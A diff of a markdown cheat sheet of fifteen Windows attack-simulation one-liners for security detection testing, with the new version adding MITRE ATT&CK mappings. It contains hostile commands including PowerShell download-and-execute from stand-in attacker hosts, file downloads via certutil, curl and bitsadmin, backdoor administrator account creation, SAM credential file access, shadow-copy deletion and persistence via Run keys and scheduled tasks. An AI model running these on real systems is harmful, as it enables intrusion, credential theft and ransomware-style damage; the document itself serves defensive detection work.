@@ -1,21 +1,19 @@
-# 🔥 Atomic Red Team One-Liners for Detection Testing
+# 🔥 Atomic Red Team One-Liners with MITRE ATT&CK Mapping
 
-These are one-liners designed to simulate malicious behavior and trigger alerts in your security stack (SIEM, EDR, etc.). Use only in isolated lab environments.
-
-| # | Command | Description |
-|--|---------|-------------|
-| 1 | `powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==` | Base64-encoded PowerShell (`Start-sleep 10`) - test for obfuscated PowerShell |
-| 2 | `certutil -urlcache -split -f http://example.com/evil.exe evil.exe` | Download file using `certutil` - simulates malware staging |
-| 3 | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d "cmd.exe /c calc.exe"` | Persistence via registry Run key |
-| 4 | `wmic process call create "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"` | WMIC command execution |
-| 5 | `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();alert('hi')` | JavaScript abuse via `rundll32.exe` |
-| 6 | `schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5` | Creates scheduled task - classic persistence method |
-| 7 | `bcdedit /set {current} bootstatuspolicy ignoreallfailures` | Disables automatic repair - potential ransomware prelude |
-| 8 | `powershell -Command "Get-Content C:\\Windows\\System32\\config\\SAM"` | Attempts access to SAM file - privilege abuse test |
-| 9 | `net user backdoor Pass123! /add` | Creates local user - test for unauthorized account creation |
-|10 | `net localgroup administrators backdoor /add` | Adds user to admin group - privilege escalation |
-|11 | `vssadmin delete shadows /all /quiet` | Deletes volume shadow copies - common ransomware tactic |
-|12 | `curl http://evil.com/malware.ps1 -o malware.ps1` | Use of `curl` for file retrieval |
-|13 | `bitsadmin /transfer myjob /download /priority high http://malicious/evil.exe C:\\evil.exe` | Uses BITS for file download |
-|14 | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/evil.ps1')"` | PowerShell obfuscation & execution |
-|15 | `echo malicious >> C:\\Windows\\System32\\drivers\\etc\\hosts` | Tampering with `hosts` file - DNS redirection test |
+|   # | Command                                                                                   | Description                             | MITRE Technique | MITRE Tactic          |
+|----:|--------------------------------------------------------------------------------------------|-----------------------------------------|------------------|------------------------|
+|   1 | powershell -Enc UwB0AGEAcgB0AC0AcwBsAGUAZQBwACAAMQAwAA==                                  | Obfuscated PowerShell                   | T1027.001        | Defense Evasion        |
+|   2 | certutil -urlcache -split -f http://example.com/evil.exe evil.exe                         | File download using certutil            | T1105            | Command and Control    |
+|   3 | reg add HKCU\...\Run                                                                       | Registry Run key persistence            | T1547.001        | Persistence             |
+|   4 | wmic process call create "powershell.exe -Command IEX ..."                                 | Executes command via WMIC               | T1047            | Execution               |
+|   5 | rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "...                                | Executes JavaScript via rundll32        | T1218.011        | Defense Evasion        |
+|   6 | schtasks /create /tn "EvilTask" /tr "cmd.exe /c calc.exe" /sc minute /mo 5                 | Scheduled task creation                 | T1053.005        | Persistence             |
+|   7 | bcdedit /set {current} bootstatuspolicy ignoreallfailures                                 | Disables recovery boot                  | T1562.001        | Defense Evasion        |
+|   8 | powershell -Command "Get-Content C:\Windows\System32\config\SAM"                           | Access to SAM file                      | T1003.002        | Credential Access       |
+|   9 | net user backdoor Pass123! /add                                                            | Creates a user account                  | T1136.001        | Persistence             |
+|  10 | net localgroup administrators backdoor /add                                                | Adds user to admin group                | T1068            | Privilege Escalation    |
+|  11 | vssadmin delete shadows /all /quiet                                                        | Deletes shadow copies                   | T1490            | Impact                  |
+|  12 | curl http://evil.com/malware.ps1 -o malware.ps1                                            | File download using curl                | T1105            | Command and Control     |
+|  13 | bitsadmin /transfer myjob ...                                                              | File download using BITS                | T1197            | Command and Control     |
+|  14 | powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(...)"                           | Obfuscated PowerShell w/ bypass         | T1059.001        | Execution               |
+|  15 | echo malicious >> C:\Windows\System32\drivers\etc\hosts                                    | Modifies hosts file                     | T1565.001        | Impact                  |
